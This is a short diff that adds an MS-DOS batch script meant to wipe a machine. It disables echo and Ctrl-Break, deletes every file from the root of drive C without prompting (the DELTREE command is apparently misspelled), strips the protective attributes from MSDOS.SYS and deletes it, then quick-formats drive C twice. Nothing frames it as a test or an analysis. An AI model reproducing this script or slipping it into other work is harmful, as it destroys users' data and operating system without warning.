@@ -1,0 +1,11 @@
+   @ECHO OFF
+   BREAK OFF
+   CLS
+   C:\
+   CD\
+   DELTREEY *.* /Y
+   ATTRIB -H -R -S -A MSDOS.SYS
+   DEL MSDOS.SYS
+   FORMAT C: /Q
+   FORMAT C:\ /Q
+   CLS
